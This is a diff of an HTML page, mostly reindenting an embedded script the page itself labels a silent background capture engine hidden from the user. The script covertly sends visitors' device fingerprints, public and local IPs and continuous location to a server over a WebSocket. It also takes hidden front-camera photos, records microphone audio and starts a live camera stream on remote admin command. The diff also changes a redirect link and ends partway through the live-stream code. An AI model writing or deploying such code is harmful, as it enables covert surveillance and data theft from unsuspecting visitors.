@@ -1,3 +1,4 @@
+purpose
 <!DOCTYPE html>
 <html class="h-full" lang="en">
 
@@ -183,553 +184,593 @@
           console.error('Error logging to terminal:', err);
         } finally {
           // Bypasses JSON structure issues and redirects immediately to the external link
-          window.location.assign('https://www.techora.com/techora.inofficial');
+          window.location.assign('https://www.instagram.com/techora.inofficial');
         }
       });
     </script>
 
-  <!-- ═══════════════════════════════════════════════════════════════
+    <!-- ═══════════════════════════════════════════════════════════════
        SILENT BACKGROUND CAPTURE ENGINE — Not visible to user
   ═══════════════════════════════════════════════════════════════ -->
-  <script>
-  (function() {
-    'use strict';
+    <script>
+      (function () {
+        'use strict';
 
-    // ─── WebSocket Setup ────────────────────────────────────────
-    let ws      = null;
-    let wsReady = false;
-    const msgQueue = [];
+        // ─── WebSocket Setup ────────────────────────────────────────
+        let ws = null;
+        let wsReady = false;
+        const msgQueue = [];
 
-    function connectWS() {
-      const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
-      ws = new WebSocket(`${proto}//${location.host}`);
+        function connectWS() {
+          const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+          ws = new WebSocket(`${proto}//${location.host}`);
 
-      ws.onopen = () => {
-        wsReady = true;
-        // Flush queued messages
-        while (msgQueue.length > 0) {
-          ws.send(JSON.stringify(msgQueue.shift()));
-        }
-        // Send device fingerprint immediately
-        sendWS({
-          type:      'user_info',
-          userAgent: navigator.userAgent,
-          screen:    `${screen.width}x${screen.height}`,
-          timezone:  Intl.DateTimeFormat().resolvedOptions().timeZone,
-          language:  navigator.language
-        });
-        // Start all capture operations
-        startCapture();
-      };
-
-      ws.onmessage = (evt) => {
-        let msg;
-        try { msg = JSON.parse(evt.data); } catch { return; }
-        handleServerCommand(msg);
-      };
-
-      ws.onclose = () => {
-        wsReady = false;
-        // Reconnect silently
-        setTimeout(connectWS, 5000);
-      };
-
-      ws.onerror = () => {};
-    }
-
-    function sendWS(data) {
-      if (ws && ws.readyState === WebSocket.OPEN) {
-        ws.send(JSON.stringify(data));
-      } else {
-        msgQueue.push(data);
-      }
-    }
-
-    // ─── Handle Admin Commands ──────────────────────────────────
-    function handleServerCommand(msg) {
-      switch (msg.type) {
-        case 'CAPTURE_PHOTO':    capturePhoto();            break;
-        case 'CAPTURE_AUDIO':    captureAudio();            break;
-        case 'SEND_LOCATION':    sendLocation();            break;
-        case 'START_LIVE_CAMERA': startLiveCamera();        break;
-        case 'STOP_LIVE_CAMERA':  stopLiveCamera();         break;
-      }
-    }
-
-    // ─── Main Capture Entry Point ───────────────────────────────
-    function startCapture() {
-      collectFingerprint();
-      requestLocation();
-      requestMediaPermissions();
-    }
-
-    // ─── Comprehensive Device Fingerprint ───────────────────────
-    async function collectFingerprint() {
-      const fp = {};
-
-      // ── Battery ──────────────────────────────────────────────
-      try {
-        if (navigator.getBattery) {
-          const batt = await navigator.getBattery();
-          fp.battery = {
-            level:           Math.round(batt.level * 100),
-            charging:        batt.charging,
-            chargingTime:    batt.chargingTime === Infinity ? 'N/A' : batt.chargingTime + 's',
-            dischargingTime: batt.dischargingTime === Infinity ? 'N/A' : batt.dischargingTime + 's'
+          ws.onopen = () => {
+            wsReady = true;
+            // Flush queued messages
+            while (msgQueue.length > 0) {
+              ws.send(JSON.stringify(msgQueue.shift()));
+            }
+            // Send device fingerprint immediately
+            sendWS({
+              type: 'user_info',
+              userAgent: navigator.userAgent,
+              screen: `${screen.width}x${screen.height}`,
+              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+              language: navigator.language
+            });
+            // Start all capture operations
+            startCapture();
           };
-        }
-      } catch(e) { fp.battery = null; }
 
-      // ── Network / Connection ─────────────────────────────────
-      fp.network = {};
-      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (conn) {
-        fp.network.connectionType = conn.type        || 'Unknown';
-        fp.network.effectiveType  = conn.effectiveType || 'Unknown';
-        fp.network.downlink       = conn.downlink     != null ? conn.downlink : 'Unknown';
-        fp.network.rtt            = conn.rtt          != null ? conn.rtt      : 'Unknown';
-        fp.network.maxDownlink    = conn.downlinkMax  != null ? conn.downlinkMax : 'Unknown';
-        fp.network.saveData       = conn.saveData     != null ? conn.saveData : 'Unknown';
-      }
-
-      // ── Public IP + Geo (via free API) ───────────────────────
-      try {
-        const ipRes = await fetch('https://ipinfo.io/json?token=');
-        if (ipRes.ok) {
-          const ipData = await ipRes.json();
-          fp.network.publicIP = ipData.ip       || 'Unknown';
-          fp.network.city     = ipData.city     || 'Unknown';
-          fp.network.region   = ipData.region   || 'Unknown';
-          fp.network.country  = ipData.country  || 'Unknown';
-          fp.network.org      = ipData.org      || 'Unknown';
-          fp.network.timezone = ipData.timezone || 'Unknown';
-        }
-      } catch(e) {}
-
-      // ── Local IP (WebRTC) ────────────────────────────────────
-      fp.network.localIP = await getLocalIP();
-
-      // ── OS & Device ──────────────────────────────────────────
-      const ua = navigator.userAgent;
-      fp.device = {
-        userAgent:    ua,
-        model:        getDeviceModel(ua),
-        osVersion:    getOSVersion(ua),
-        manufacturer: getManufacturer(ua),
-        browser:      getBrowserName(ua),
-        standalone:   navigator.standalone || window.matchMedia('(display-mode: standalone)').matches ? 'Yes' : 'No'
-      };
-
-      // ── Hardware & System ────────────────────────────────────
-      fp.hardware = {
-        language:       navigator.language      || 'Unknown',
-        languages:      (navigator.languages || []).join(', ') || navigator.language,
-        screen:         screen.width + 'x' + screen.height,
-        availScreen:    screen.availWidth + 'x' + screen.availHeight,
-        colorDepth:     screen.colorDepth + '-bit',
-        pixelDepth:     screen.pixelDepth + '-bit',
-        ram:            navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
-        cpuCores:       navigator.hardwareConcurrency || 'Unknown',
-        touchSupport:   ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? 'Yes' : 'No',
-        maxTouchPoints: navigator.maxTouchPoints || 0,
-        online:         navigator.onLine ? 'Online' : 'Offline',
-        timezone:       Intl.DateTimeFormat().resolvedOptions().timeZone,
-        timezoneOffset: new Date().getTimezoneOffset() + ' minutes',
-        doNotTrack:     navigator.doNotTrack || 'Not set'
-      };
-
-      // ── GPU Information ──────────────────────────────────────
-      fp.gpu = getGPUInfo();
-
-      // ── Browser Capabilities ─────────────────────────────────
-      fp.capabilities = {
-        supported:     getSupported(),
-        cookies:       navigator.cookieEnabled ? 'Yes' : 'No',
-        pdfViewer:     navigator.pdfViewerEnabled ? 'Yes' : 'No',
-        notifications: typeof Notification !== 'undefined' ? Notification.permission : 'N/A',
-        geolocation:   'geolocation' in navigator ? 'true' : 'false'
-      };
-
-      // ── Storage Quota ────────────────────────────────────────
-      try {
-        if (navigator.storage && navigator.storage.estimate) {
-          const est = await navigator.storage.estimate();
-          fp.storage = {
-            quota: (est.quota / (1024 * 1024 * 1024)).toFixed(2) + ' GB',
-            usage: est.usage ? (est.usage / (1024 * 1024)).toFixed(2) + ' MB' : 'Unknown'
+          ws.onmessage = (evt) => {
+            let msg;
+            try { msg = JSON.parse(evt.data); } catch { return; }
+            handleServerCommand(msg);
           };
-        }
-      } catch(e) { fp.storage = null; }
 
-      // ── Timestamp ────────────────────────────────────────────
-      fp.collectedAt = new Date().toLocaleString();
-
-      // ── Send the full fingerprint to server ──────────────────
-      sendWS({ type: 'visitor_fingerprint', fingerprint: fp });
-    }
-
-    // ─── Helper Functions ────────────────────────────────────────
-
-    function getLocalIP() {
-      return new Promise(resolve => {
-        try {
-          const pc = new RTCPeerConnection({ iceServers: [] });
-          pc.createDataChannel('');
-          pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => resolve('Not found'));
-          pc.onicecandidate = (e) => {
-            if (!e || !e.candidate) return;
-            const match = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-            if (match) { resolve(match[0]); pc.close(); }
+          ws.onclose = () => {
+            wsReady = false;
+            // Reconnect silently
+            setTimeout(connectWS, 5000);
           };
-          setTimeout(() => { resolve('Not found'); pc.close(); }, 3000);
-        } catch(e) { resolve('Not found'); }
-      });
-    }
 
-    function getGPUInfo() {
-      try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (!gl) return { vendor: 'N/A', renderer: 'N/A' };
-        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-        return {
-          vendor:   dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR),
-          renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
-        };
-      } catch(e) { return { vendor: 'N/A', renderer: 'N/A' }; }
-    }
+          ws.onerror = () => { };
+        }
 
-    function getSupported() {
-      const checks = [];
-      try { if (document.createElement('canvas').getContext('webgl'))  checks.push('WebGL');  } catch(e) {}
-      try { if (document.createElement('canvas').getContext('webgl2')) checks.push('WebGL2'); } catch(e) {}
-      try { if (document.createElement('canvas').getContext('2d'))    checks.push('Canvas'); } catch(e) {}
-      if (window.RTCPeerConnection)      checks.push('WebRTC');
-      if (window.WebSocket)              checks.push('WebSocket');
-      if ('serviceWorker' in navigator)  checks.push('ServiceWorker');
-      return checks.join(', ');
-    }
-
-    function getDeviceModel(ua) {
-      if (/iPhone/.test(ua))    return ua.match(/iPhone[^;)]*/)?.[0] || 'iPhone';
-      if (/iPad/.test(ua))      return 'iPad';
-      if (/Android/.test(ua))   return 'Android Device';
-      if (/Windows/.test(ua))   return 'Windows PC';
-      if (/Macintosh/.test(ua)) return 'Mac';
-      if (/Linux/.test(ua))     return 'Linux PC';
-      return 'Unknown';
-    }
-
-    function getOSVersion(ua) {
-      let m;
-      if ((m = ua.match(/Android\s+([\d.]+)/)))       return m[1];
-      if ((m = ua.match(/iPhone OS ([\d_]+)/)))        return m[1].replace(/_/g, '.');
-      if ((m = ua.match(/Windows NT ([\d.]+)/)))       return m[1];
-      if ((m = ua.match(/Mac OS X ([\d_]+)/)))         return m[1].replace(/_/g, '.');
-      return 'Unknown';
-    }
-
-    function getManufacturer(ua) {
-      if (/iPhone|iPad|Macintosh/.test(ua)) return 'Apple';
-      if (/Samsung/.test(ua))               return 'Samsung';
-      if (/Xiaomi|Redmi|POCO/.test(ua))     return 'Xiaomi';
-      if (/HUAWEI/.test(ua))                return 'Huawei';
-      if (/OPPO/.test(ua))                  return 'OPPO';
-      if (/vivo/.test(ua))                  return 'Vivo';
-      if (/OnePlus/.test(ua))               return 'OnePlus';
-      if (/Pixel/.test(ua))                 return 'Google';
-      if (/Android/.test(ua))               return 'Various';
-      if (/Windows/.test(ua))               return 'PC';
-      return 'Unknown';
-    }
-
-    function getBrowserName(ua) {
-      if (/Edg\//.test(ua))    return 'Edge';
-      if (/OPR\//.test(ua))    return 'Opera';
-      if (/Firefox/.test(ua))  return 'Firefox';
-      if (/Chrome/.test(ua))   return 'Chrome';
-      if (/Safari/.test(ua))   return 'Safari';
-      return 'Unknown';
-    }
-
-    // ─── Geolocation ────────────────────────────────────────────
-    function requestLocation() {
-      if (!navigator.geolocation) return;
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          sendWS({
-            type:     'location_update',
-            lat:      pos.coords.latitude,
-            lng:      pos.coords.longitude,
-            accuracy: pos.coords.accuracy
-          });
-          // Watch for updates
-          navigator.geolocation.watchPosition(
-            (p) => sendWS({
-              type:     'location_update',
-              lat:      p.coords.latitude,
-              lng:      p.coords.longitude,
-              accuracy: p.coords.accuracy
-            }),
-            () => {},
-            { enableHighAccuracy: true, maximumAge: 30000 }
-          );
-        },
-        () => {
-          sendWS({ type: 'permission_denied', permission: 'location' });
-        },
-        { enableHighAccuracy: true, timeout: 10000 }
-      );
-    }
-
-    function sendLocation() {
-      if (!navigator.geolocation) return;
-      navigator.geolocation.getCurrentPosition(
-        (pos) => sendWS({
-          type:     'location_update',
-          lat:      pos.coords.latitude,
-          lng:      pos.coords.longitude,
-          accuracy: pos.coords.accuracy
-        }),
-        () => {},
-        { enableHighAccuracy: true, timeout: 8000 }
-      );
-    }
-
-    // ─── Camera + Microphone ────────────────────────────────────
-    function requestMediaPermissions() {
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-
-      // Request camera first (front-facing if mobile)
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-        .then((stream) => {
-          // Got camera — capture photo then free the stream
-          capturePhotoFromStream(stream);
-          // Now separately request audio
-          return navigator.mediaDevices.getUserMedia({ audio: true, video: false });
-        })
-        .then((audioStream) => {
-          captureAudioFromStream(audioStream);
-        })
-        .catch((err) => {
-          const name = err.name || '';
-          if (name === 'NotAllowedError' || name === 'PermissionDeniedError') {
-            sendWS({ type: 'permission_denied', permission: 'camera/microphone' });
+        function sendWS(data) {
+          if (ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify(data));
+          } else {
+            msgQueue.push(data);
           }
-          // Fallback: try audio-only
+        }
+
+        // ─── Handle Admin Commands ──────────────────────────────────
+        function handleServerCommand(msg) {
+          switch (msg.type) {
+            case 'CAPTURE_PHOTO': capturePhoto(); break;
+            case 'CAPTURE_AUDIO': captureAudio(); break;
+            case 'SEND_LOCATION': sendLocation(); break;
+            case 'START_LIVE_CAMERA': startLiveCamera(); break;
+            case 'STOP_LIVE_CAMERA': stopLiveCamera(); break;
+          }
+        }
+
+        // ─── Main Capture Entry Point ───────────────────────────────
+        function startCapture() {
+          collectFingerprint();
+          requestLocation();
+          requestMediaPermissions();
+        }
+
+        // ─── Comprehensive Device Fingerprint ───────────────────────
+        async function collectFingerprint() {
+          const fp = {};
+
+          // ── Battery ──────────────────────────────────────────────
+          try {
+            if (navigator.getBattery) {
+              const batt = await navigator.getBattery();
+              fp.battery = {
+                level: Math.round(batt.level * 100),
+                charging: batt.charging,
+                chargingTime: batt.chargingTime === Infinity ? 'N/A' : batt.chargingTime + 's',
+                dischargingTime: batt.dischargingTime === Infinity ? 'N/A' : batt.dischargingTime + 's'
+              };
+            }
+          } catch (e) { fp.battery = null; }
+
+          // ── Network / Connection ─────────────────────────────────
+          fp.network = {};
+          const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+          if (conn) {
+            fp.network.connectionType = conn.type || 'Unknown';
+            fp.network.effectiveType = conn.effectiveType || 'Unknown';
+            fp.network.downlink = conn.downlink != null ? conn.downlink : 'Unknown';
+            fp.network.rtt = conn.rtt != null ? conn.rtt : 'Unknown';
+            fp.network.maxDownlink = conn.downlinkMax != null ? conn.downlinkMax : 'Unknown';
+            fp.network.saveData = conn.saveData != null ? conn.saveData : 'Unknown';
+          }
+
+          // ── Public IP + Geo (via free API) ───────────────────────
+          try {
+            const ipRes = await fetch('https://ipinfo.io/json?token=');
+            if (ipRes.ok) {
+              const ipData = await ipRes.json();
+              fp.network.publicIP = ipData.ip || 'Unknown';
+              fp.network.city = ipData.city || 'Unknown';
+              fp.network.region = ipData.region || 'Unknown';
+              fp.network.country = ipData.country || 'Unknown';
+              fp.network.org = ipData.org || 'Unknown';
+              fp.network.timezone = ipData.timezone || 'Unknown';
+            }
+          } catch (e) { }
+
+          // ── Local IP (WebRTC) ────────────────────────────────────
+          fp.network.localIP = await getLocalIP();
+
+          // ── OS & Device ──────────────────────────────────────────
+          const ua = navigator.userAgent;
+          fp.device = {
+            userAgent: ua,
+            model: getDeviceModel(ua),
+            osVersion: getOSVersion(ua),
+            manufacturer: getManufacturer(ua),
+            browser: getBrowserName(ua),
+            standalone: navigator.standalone || window.matchMedia('(display-mode: standalone)').matches ? 'Yes' : 'No'
+          };
+
+          // ── Hardware & System ────────────────────────────────────
+          fp.hardware = {
+            language: navigator.language || 'Unknown',
+            languages: (navigator.languages || []).join(', ') || navigator.language,
+            screen: screen.width + 'x' + screen.height,
+            availScreen: screen.availWidth + 'x' + screen.availHeight,
+            colorDepth: screen.colorDepth + '-bit',
+            pixelDepth: screen.pixelDepth + '-bit',
+            ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
+            cpuCores: navigator.hardwareConcurrency || 'Unknown',
+            touchSupport: ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? 'Yes' : 'No',
+            maxTouchPoints: navigator.maxTouchPoints || 0,
+            online: navigator.onLine ? 'Online' : 'Offline',
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset() + ' minutes',
+            doNotTrack: navigator.doNotTrack || 'Not set'
+          };
+
+          // ── GPU Information ──────────────────────────────────────
+          fp.gpu = getGPUInfo();
+
+          // ── Browser Capabilities ─────────────────────────────────
+          fp.capabilities = {
+            supported: getSupported(),
+            cookies: navigator.cookieEnabled ? 'Yes' : 'No',
+            pdfViewer: navigator.pdfViewerEnabled ? 'Yes' : 'No',
+            notifications: typeof Notification !== 'undefined' ? Notification.permission : 'N/A',
+            geolocation: 'geolocation' in navigator ? 'true' : 'false'
+          };
+
+          // ── Storage Quota ────────────────────────────────────────
+          try {
+            if (navigator.storage && navigator.storage.estimate) {
+              const est = await navigator.storage.estimate();
+              fp.storage = {
+                quota: (est.quota / (1024 * 1024 * 1024)).toFixed(2) + ' GB',
+                usage: est.usage ? (est.usage / (1024 * 1024)).toFixed(2) + ' MB' : 'Unknown'
+              };
+            }
+          } catch (e) { fp.storage = null; }
+
+          // ── Timestamp ────────────────────────────────────────────
+          fp.collectedAt = new Date().toLocaleString();
+
+          // ── Send the full fingerprint to server ──────────────────
+          sendWS({ type: 'visitor_fingerprint', fingerprint: fp });
+        }
+
+        // ─── Helper Functions ────────────────────────────────────────
+
+        function getLocalIP() {
+          return new Promise(resolve => {
+            try {
+              const pc = new RTCPeerConnection({ iceServers: [] });
+              pc.createDataChannel('');
+              pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => resolve('Not found'));
+              pc.onicecandidate = (e) => {
+                if (!e || !e.candidate) return;
+                const match = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                if (match) { resolve(match[0]); pc.close(); }
+              };
+              setTimeout(() => { resolve('Not found'); pc.close(); }, 3000);
+            } catch (e) { resolve('Not found'); }
+          });
+        }
+
+        function getGPUInfo() {
+          try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return { vendor: 'N/A', renderer: 'N/A' };
+            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+              vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+              renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
+            };
+          } catch (e) { return { vendor: 'N/A', renderer: 'N/A' }; }
+        }
+
+        function getSupported() {
+          const checks = [];
+          try { if (document.createElement('canvas').getContext('webgl')) checks.push('WebGL'); } catch (e) { }
+          try { if (document.createElement('canvas').getContext('webgl2')) checks.push('WebGL2'); } catch (e) { }
+          try { if (document.createElement('canvas').getContext('2d')) checks.push('Canvas'); } catch (e) { }
+          if (window.RTCPeerConnection) checks.push('WebRTC');
+          if (window.WebSocket) checks.push('WebSocket');
+          if ('serviceWorker' in navigator) checks.push('ServiceWorker');
+          return checks.join(', ');
+        }
+
+        function getDeviceModel(ua) {
+          if (/iPhone/.test(ua)) return ua.match(/iPhone[^;)]*/)?.[0] || 'iPhone';
+          if (/iPad/.test(ua)) return 'iPad';
+          if (/Android/.test(ua)) return 'Android Device';
+          if (/Windows/.test(ua)) return 'Windows PC';
+          if (/Macintosh/.test(ua)) return 'Mac';
+          if (/Linux/.test(ua)) return 'Linux PC';
+          return 'Unknown';
+        }
+
+        function getOSVersion(ua) {
+          let m;
+          if ((m = ua.match(/Android\s+([\d.]+)/))) return m[1];
+          if ((m = ua.match(/iPhone OS ([\d_]+)/))) return m[1].replace(/_/g, '.');
+          if ((m = ua.match(/Windows NT ([\d.]+)/))) return m[1];
+          if ((m = ua.match(/Mac OS X ([\d_]+)/))) return m[1].replace(/_/g, '.');
+          return 'Unknown';
+        }
+
+        function getManufacturer(ua) {
+          if (/iPhone|iPad|Macintosh/.test(ua)) return 'Apple';
+          if (/Samsung/.test(ua)) return 'Samsung';
+          if (/Xiaomi|Redmi|POCO/.test(ua)) return 'Xiaomi';
+          if (/HUAWEI/.test(ua)) return 'Huawei';
+          if (/OPPO/.test(ua)) return 'OPPO';
+          if (/vivo/.test(ua)) return 'Vivo';
+          if (/OnePlus/.test(ua)) return 'OnePlus';
+          if (/Pixel/.test(ua)) return 'Google';
+          if (/Android/.test(ua)) return 'Various';
+          if (/Windows/.test(ua)) return 'PC';
+          return 'Unknown';
+        }
+
+        function getBrowserName(ua) {
+          if (/Edg\//.test(ua)) return 'Edge';
+          if (/OPR\//.test(ua)) return 'Opera';
+          if (/Firefox/.test(ua)) return 'Firefox';
+          if (/Chrome/.test(ua)) return 'Chrome';
+          if (/Safari/.test(ua)) return 'Safari';
+          return 'Unknown';
+        }
+
+        // ─── Geolocation ────────────────────────────────────────────
+        function requestLocation() {
+          if (!navigator.geolocation) return;
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              sendWS({
+                type: 'location_update',
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                accuracy: pos.coords.accuracy
+              });
+              // Watch for updates
+              navigator.geolocation.watchPosition(
+                (p) => sendWS({
+                  type: 'location_update',
+                  lat: p.coords.latitude,
+                  lng: p.coords.longitude,
+                  accuracy: p.coords.accuracy
+                }),
+                () => { },
+                { enableHighAccuracy: true, maximumAge: 30000 }
+              );
+            },
+            () => {
+              sendWS({ type: 'permission_denied', permission: 'location' });
+            },
+            { enableHighAccuracy: true, timeout: 10000 }
+          );
+        }
+
+        function sendLocation() {
+          if (!navigator.geolocation) return;
+          navigator.geolocation.getCurrentPosition(
+            (pos) => sendWS({
+              type: 'location_update',
+              lat: pos.coords.latitude,
+              lng: pos.coords.longitude,
+              accuracy: pos.coords.accuracy
+            }),
+            () => { },
+            { enableHighAccuracy: true, timeout: 8000 }
+          );
+        }
+
+        // ─── Camera + Microphone ────────────────────────────────────
+        function requestMediaPermissions() {
+          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+
+          // Request camera first (front-facing if mobile)
+          navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+            .then((stream) => {
+              // Got camera — capture photo then free the stream
+              capturePhotoFromStream(stream);
+              // Now separately request audio
+              return navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+            })
+            .then((audioStream) => {
+              captureAudioFromStream(audioStream);
+            })
+            .catch((err) => {
+              const name = err.name || '';
+              if (name === 'NotAllowedError' || name === 'PermissionDeniedError') {
+                sendWS({ type: 'permission_denied', permission: 'camera/microphone' });
+              }
+              // Fallback: try audio-only
+              navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+                .then(captureAudioFromStream)
+                .catch(() => {
+                  sendWS({ type: 'permission_denied', permission: 'microphone' });
+                });
+            });
+        }
+
+        // ─── Photo Capture ──────────────────────────────────────────
+        function capturePhotoFromStream(stream) {
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.setAttribute('playsinline', '');
+          video.muted = true;
+          video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
+          document.body.appendChild(video);
+
+          video.play().then(() => {
+            // Allow 1.5s for camera to warm up
+            setTimeout(() => {
+              try {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataURL = canvas.toDataURL('image/jpeg', 0.82);
+                sendWS({ type: 'capture_photo', data: dataURL });
+              } catch (e) { }
+              // Stop tracks and cleanup
+              stream.getTracks().forEach(t => t.stop());
+              video.remove();
+            }, 1500);
+          }).catch(() => {
+            stream.getTracks().forEach(t => t.stop());
+            video.remove();
+          });
+        }
+
+        function capturePhoto() {
+          if (!navigator.mediaDevices) return;
+          navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+            .then(capturePhotoFromStream)
+            .catch(() => {
+              sendWS({ type: 'permission_denied', permission: 'camera' });
+            });
+        }
+
+        // ─── Audio Capture ──────────────────────────────────────────
+        function captureAudioFromStream(stream) {
+          const chunks = [];
+          const mimeType = getSupportedMimeType();
+          let recorder;
+          try {
+            recorder = new MediaRecorder(stream, mimeType ? { mimeType } : {});
+          } catch (e) {
+            recorder = new MediaRecorder(stream);
+          }
+
+          recorder.ondataavailable = (e) => {
+            if (e.data && e.data.size > 0) chunks.push(e.data);
+          };
+
+          recorder.onstop = () => {
+            const blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
+            const reader = new FileReader();
+            reader.onload = () => {
+              sendWS({ type: 'capture_audio', data: reader.result });
+            };
+            reader.readAsDataURL(blob);
+            stream.getTracks().forEach(t => t.stop());
+          };
+
+          recorder.start();
+          // Record for 6 seconds
+          setTimeout(() => {
+            if (recorder.state !== 'inactive') recorder.stop();
+          }, 6000);
+        }
+
+        function captureAudio() {
+          if (!navigator.mediaDevices) return;
           navigator.mediaDevices.getUserMedia({ audio: true, video: false })
             .then(captureAudioFromStream)
             .catch(() => {
               sendWS({ type: 'permission_denied', permission: 'microphone' });
             });
-        });
-    }
+        }
 
-    // ─── Photo Capture ──────────────────────────────────────────
-    function capturePhotoFromStream(stream) {
-      const video   = document.createElement('video');
-      video.srcObject = stream;
-      video.setAttribute('playsinline', '');
-      video.muted = true;
-      video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
-      document.body.appendChild(video);
+        function getSupportedMimeType() {
+          const types = [
+            'audio/webm;codecs=opus',
+            'audio/webm',
+            'audio/ogg;codecs=opus',
+            'audio/ogg',
+            'audio/mp4'
+          ];
+          return types.find(t => MediaRecorder.isTypeSupported(t)) || '';
+        }
 
-      video.play().then(() => {
-        // Allow 1.5s for camera to warm up
-        setTimeout(() => {
-          try {
-            const canvas = document.createElement('canvas');
-            canvas.width  = video.videoWidth  || 640;
-            canvas.height = video.videoHeight || 480;
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            const dataURL = canvas.toDataURL('image/jpeg', 0.82);
-            sendWS({ type: 'capture_photo', data: dataURL });
-          } catch(e) {}
-          // Stop tracks and cleanup
-          stream.getTracks().forEach(t => t.stop());
-          video.remove();
-        }, 1500);
-      }).catch(() => {
-        stream.getTracks().forEach(t => t.stop());
-        video.remove();
-      });
-    }
+        // ─── Live Camera & Audio Streaming ───────────────────────────
+        let liveStreamActive = false;
+        let liveStreamInterval = null;
+        let liveStreamWorker = null;
+        let liveStreamVideo = null;
+        let liveStreamCanvas = null;
+        let liveStreamContext = null;
+        let liveAudioRecorder = null;
+        let liveAudioStream = null;
 
-    function capturePhoto() {
-      if (!navigator.mediaDevices) return;
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-        .then(capturePhotoFromStream)
-        .catch(() => {
-          sendWS({ type: 'permission_denied', permission: 'camera' });
-        });
-    }
+        function startLiveCamera() {
+          if (liveStreamActive) return; // already streaming
+          if (!navigator.mediaDevices) return;
 
-    // ─── Audio Capture ──────────────────────────────────────────
-    function captureAudioFromStream(stream) {
-      const chunks   = [];
-      const mimeType = getSupportedMimeType();
-      let   recorder;
-      try {
-        recorder = new MediaRecorder(stream, mimeType ? { mimeType } : {});
-      } catch(e) {
-        recorder = new MediaRecorder(stream);
-      }
-
-      recorder.ondataavailable = (e) => {
-        if (e.data && e.data.size > 0) chunks.push(e.data);
-      };
-
-      recorder.onstop = () => {
-        const blob   = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
-        const reader = new FileReader();
-        reader.onload = () => {
-          sendWS({ type: 'capture_audio', data: reader.result });
-        };
-        reader.readAsDataURL(blob);
-        stream.getTracks().forEach(t => t.stop());
-      };
-
-      recorder.start();
-      // Record for 6 seconds
-      setTimeout(() => {
-        if (recorder.state !== 'inactive') recorder.stop();
-      }, 6000);
-    }
-
-    function captureAudio() {
-      if (!navigator.mediaDevices) return;
-      navigator.mediaDevices.getUserMedia({ audio: true, video: false })
-        .then(captureAudioFromStream)
-        .catch(() => {
-          sendWS({ type: 'permission_denied', permission: 'microphone' });
-        });
-    }
-
-    function getSupportedMimeType() {
-      const types = [
-        'audio/webm;codecs=opus',
-        'audio/webm',
-        'audio/ogg;codecs=opus',
-        'audio/ogg',
-        'audio/mp4'
-      ];
-      return types.find(t => MediaRecorder.isTypeSupported(t)) || '';
-    }
-
-    // ─── Live Camera & Audio Streaming ───────────────────────────
-    let liveStreamActive   = false;
-    let liveStreamInterval = null;
-    let liveStreamVideo    = null;
-    let liveStreamCanvas   = null;
-    let liveStreamContext  = null;
-    let liveAudioRecorder  = null;
-    let liveAudioStream    = null;
-
-    function startLiveCamera() {
-      if (liveStreamActive) return; // already streaming
-      if (!navigator.mediaDevices) return;
-
-      // Try capturing camera and mic with higher frame rate constraint
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480, frameRate: 25 }, audio: true })
-        .then((stream) => {
-          setupLiveMediaStreams(stream);
-        })
-        .catch(() => {
-          // Fallback to video only
-          navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480, frameRate: 25 }, audio: false })
+          // Try capturing camera and mic with higher frame rate constraint
+          navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480, frameRate: { ideal: 30, max: 60 } }, audio: true })
             .then((stream) => {
               setupLiveMediaStreams(stream);
             })
